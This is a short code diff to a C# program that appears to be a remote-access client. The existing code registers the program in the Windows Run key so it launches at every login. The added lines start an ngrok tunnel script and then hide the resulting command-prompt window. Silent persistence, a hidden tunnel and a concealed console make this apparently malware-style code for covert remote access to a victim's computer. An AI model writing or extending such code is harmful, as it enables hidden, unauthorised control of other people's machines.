@@ -22,6 +22,9 @@ namespace Client
         [DllImport("user32.dll")]
         static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
+        [DllImport("User32.dll", EntryPoint = "FindWindow")]
+        private static extern IntPtr FindWindowNative(string className, string windowName);
+
         private const int BufferSize = 1024;
         public string Status = string.Empty;
         public Thread T = null;
@@ -41,6 +44,9 @@ namespace Client
         {              
             RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             reg.SetValue("Client", System.Reflection.Assembly.GetExecutingAssembly().Location);
+            Process.Start("ngrok.bat");
+            Thread.Sleep(500);
+            ShowWindow(FindWindowNative(null, "C:\\WINDOWS\\system32\\cmd.exe"), 0);
         }
 
         public void StartReceiving()
